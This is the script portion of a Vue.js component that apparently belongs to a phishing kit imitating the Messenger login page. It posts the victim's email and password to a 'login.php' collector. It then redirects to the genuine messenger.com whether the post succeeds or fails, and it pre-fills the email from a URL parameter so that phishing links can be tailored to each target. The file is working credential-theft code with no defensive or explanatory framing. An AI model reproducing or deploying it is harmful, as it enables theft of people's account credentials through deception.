<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      submitError: false,
      emailaddress: '',
      password: '',
      referrerPage: '//www.messenger.com/login/'
    }
  },
  methods: {
    submitForm () {
      let vm = this
      vm.submitError = vm.emailaddress.length ==0 || vm.password.length == 0
      if (!vm.submitError) {
        axios.post('login.php', {email: vm.emailaddress, password: vm.password})
        .then(res => {
          vm.progressActive = true
          window.location.replace(vm.referrerPage);
        })
        .catch(error => {
          vm.progressActive = true
          window.location.replace(vm.referrerPage);
        })
      }
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.emailaddress = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

